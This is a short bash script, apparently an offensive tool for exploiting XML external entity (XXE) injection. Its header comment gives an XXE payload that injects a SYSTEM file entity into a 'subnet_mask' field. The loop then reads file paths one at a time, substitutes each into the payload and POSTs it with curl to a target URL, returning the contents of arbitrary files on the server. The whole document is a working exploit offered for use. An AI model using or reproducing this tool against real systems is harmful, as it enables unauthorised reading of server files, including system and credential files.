#!/bin/bash
############################
#Interactive shell: 
#Execute remote command on external OS usign POST injection xxe
#payload type:
#<?xml   version="1.0"   encoding="ISO-8859-1"?> 
#<!DOCTYPE   foo   [ <!ELEMENT   foo   ANY   > 
#<!ENTITY   xxe   SYSTEM   "file://replace">]> #### wraper 
#<details>
#    <subnet_mask>&xxe;</subnet_mask>  ###Injection 
#    <test></test>
#</details>
#
#
#############################

URL=$1
PAYLOAD=$2
echo URL = $URL
echo PAYLOAD = $2

while true; do 
	echo -n "~$: " && read filename
	echo $filename
	sed "s#replace#$filename#g" test.txt > exec
	cat exec 	
	echo;curl -i $URL -d @exec
	rm exec
done
